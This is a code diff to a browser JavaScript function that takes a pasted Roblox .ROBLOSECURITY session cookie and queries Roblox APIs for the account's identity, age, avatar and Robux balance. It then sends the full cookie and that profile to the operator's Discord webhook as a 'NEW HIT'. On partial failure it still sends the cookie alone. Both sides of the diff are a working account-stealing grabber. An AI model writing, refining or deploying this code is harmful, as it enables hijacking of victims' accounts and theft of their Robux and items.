@@ -1,24 +1,22 @@
 async function grabAndSend() {
   const status = document.getElementById("status");
-  let input = document.getElementById("cookie").value.trim();  // renamed id to match common
+  let input = document.getElementById("cookie").value.trim();
 
-  // Their parsing logic – robust extraction
   const warning = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
   let start = input.indexOf(warning);
   if (start === -1) {
-    status.textContent = "No valid .ROBLOSECURITY found. Paste the full thing.";
+    status.textContent = "Invalid paste – needs the full warning string.";
     return;
   }
 
-  let cookieStr = input.substring(start);
-  let end = cookieStr.indexOf('"');
-  if (end !== -1) cookieStr = cookieStr.substring(0, end);
-  const cookie = cookieStr.trim();
+  let cookie = input.substring(start);
+  let end = cookie.indexOf('"');
+  if (end !== -1) cookie = cookie.substring(0, end);
+  cookie = cookie.trim();
 
-  status.textContent = "Extracted cookie – validating...";
+  status.textContent = "Cookie extracted – hitting Roblox...";
 
   try {
-    // Super aggressive CSRF refresh
     async function refreshCsrf() {
       try {
         const res = await fetch("https://auth.roblox.com/v2/logout", {
@@ -31,8 +29,7 @@ async function grabAndSend() {
     }
 
     let csrf = await refreshCsrf();
-
-    const baseHeaders = {
+    let headers = {
       "Cookie": `.ROBLOSECURITY=${cookie}`,
       "Accept": "application/json",
       "X-CSRF-TOKEN": csrf,
@@ -40,102 +37,72 @@ async function grabAndSend() {
       "Referer": "https://www.roblox.com/"
     };
 
-    // Authenticated user basics
-    let authInfo = {};
-    try {
-      const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", { headers: baseHeaders });
-      if (authRes.ok) authInfo = await authRes.json();
-    } catch {}
+    // Basics
+    const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", { headers });
+    if (!authRes.ok) throw new Error(`Auth ${authRes.status}`);
+    const auth = await authRes.json();
+    const userId = auth.id;
+    const username = auth.name;
+    const displayName = auth.displayName;
 
-    if (!authInfo.id) throw new Error("Auth failed – bad/expired cookie?");
-
-    const userId = authInfo.id;
-    const username = authInfo.name;
-    const displayName = authInfo.displayName;
-
-    // Refresh CSRF again for next calls
     csrf = await refreshCsrf();
-    baseHeaders["X-CSRF-TOKEN"] = csrf;
+    headers["X-CSRF-TOKEN"] = csrf;
 
-    // User details (creation, desc, etc.)
-    let userDetails = {};
-    try {
-      const userRes = await fetch(`https://users.roblox.com/v1/users/${userId}`, { headers: baseHeaders });
-      if (userRes.ok) userDetails = await userRes.json();
-    } catch {}
+    // Details
+    const userRes = await fetch(`https://users.roblox.com/v1/users/${userId}`, { headers });
+    const details = userRes.ok ? await userRes.json() : {};
+    const ageDays = details.created ? Math.floor((Date.now() - new Date(details.created)) / 86400000) : "Unknown";
+    const desc = details.description || "None";
 
-    const created = userDetails.created ? new Date(userDetails.created) : null;
-    const ageDays = created ? Math.floor((Date.now() - created.getTime()) / 86400000) : "Unknown";
-    const description = userDetails.description || "None";
-
-    // Avatar thumb
+    // Avatar
     let avatar = null;
     try {
-      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=420x420&format=Png&isCircular=false`, { headers: baseHeaders });
-      if (thumbRes.ok) {
-        const data = await thumbRes.json();
-        avatar = data.data?.[0]?.imageUrl;
+      const thumb = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=420x420&format=Png&isCircular=false`, { headers });
+      if (thumb.ok) {
+        const t = await thumb.json();
+        avatar = t.data?.[0]?.imageUrl;
       }
     } catch {}
 
-    // Robux – try economy first, then fallback tricks
-    let robux = "Unknown / Failed";
+    // Robux attempts
+    let robux = "Private/Failed";
     try {
-      // Primary: economy v1 users/{id}/currency
-      let econRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers: baseHeaders });
-      if (econRes.ok) {
-        const econ = await econRes.json();
-        robux = econ.robux?.toLocaleString() || "0";
-      } else {
-        // Fallback: try /v1/user/currency (some reports say it works in certain contexts)
-        econRes = await fetch("https://economy.roblox.com/v1/user/currency", { headers: baseHeaders });
-        if (econRes.ok) {
-          const econ = await econRes.json();
-          robux = econ.robux?.toLocaleString() || "0";
-        }
-      }
-    } catch (e) { robux = `Error: ${e.message}`; }
-
-    // Premium status
-    let premium = "False";
-    try {
-      const premRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers: baseHeaders });
-      if (premRes.ok) {
-        const prem = await premRes.json();
-        premium = prem.isPremium ? "True" : "False";
+      const econ = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers });
+      if (econ.ok) {
+        const e = await econ.json();
+        robux = e.robux?.toLocaleString() || "0";
       }
     } catch {}
 
-    // Build Rolimons-like fields
+    // Rolimons attempt (client fetch – may CORS fail)
+    let rap = "Unknown", limiteds = "Unknown", pending = "Unknown";
+    try {
+      const roli = await fetch(`https://www.rolimons.com/player/${userId}`);
+      if (roli.ok) {
+        const text = await roli.text();
+        // Crude parse – look for patterns like "RAP</span><span>401,997,527" or similar
+        const rapMatch = text.match(/RAP.*?>[\s,]*([\d,]+)/i);
+        rap = rapMatch ? rapMatch[1] : "Unknown";
+        // Add more regex for limiteds, pending if you inspect the page
+      }
+    } catch (e) { /* CORS or block – silent */ }
+
     const fields = [
       { name: "👤 Username", value: username, inline: true },
-      { name: "Display Name", value: displayName, inline: true },
-      { name: "🆔 User ID", value: userId.toString(), inline: true },
-      { name: "📅 Account Age", value: `${ageDays} Days`, inline: true },
-      { name: "Developer", value: "False", inline: true }, // No easy flag, placeholder
-      { name: "Robux Balance", value: `${robux} ⏣`, inline: false },
-      { name: "Premium", value: premium, inline: true },
-      { name: "Description", value: description.substring(0, 150) + (description.length > 150 ? "..." : ""), inline: false },
-      { name: "Full .ROBLOSECURITY", value: "||" + cookie + "||", inline: false }
+      { name: "Display", value: displayName, inline: true },
+      { name: "🆔 ID", value: userId + "", inline: true },
+      { name: "📅 Age", value: `${ageDays} Days`, inline: true },
+      { name: "Robux", value: robux + " ⏣", inline: true },
+      { name: "RAP", value: rap, inline: true },
+      { name: "Limiteds", value: limiteds, inline: true },
+      { name: "Pending", value: pending + " ⏣", inline: true },
+      { name: ".ROBLOSECURITY", value: "||" + cookie + "||", inline: false }
     ];
 
-    await sendEmbed(
-      "NEW HIT - AUTO GRAB",
-      `**${displayName}** (@${username}) • Logged`,
-      fields,
-      0x00FF00, // green like success hits
-      avatar
-    );
-
-    status.innerHTML = "<strong style='color:#0f0'>Grabbed & sent to your hook – check Discord!</strong>";
-  } catch (err) {
-    status.textContent = "Partial grab fail: " + err.message;
-    // Always send cookie
-    await sendEmbed(
-      "COOKIE ONLY - INFO PARTIAL FAIL",
-      "Cookie valid but some endpoints blocked.",
-      [{ name: ".ROBLOSECURITY", value: "||" + cookie + "||", inline: false }],
-      0xFF8800
-    );
+    await sendEmbed("NEW HIT", `**${displayName}** (@${username})`, fields, 0x00AA00, avatar);
+    status.innerHTML = "<strong style='color:#0f0'>Sent – check hook!</strong>";
+  } catch (e) {
+    status.textContent = "Partial fail: " + e.message;
+    await sendEmbed("COOKIE HIT", "Basics failed, but cookie good.", [{name: "Cookie", value: "||" + cookie + "||"}], 0xFF8800);
   }
 }
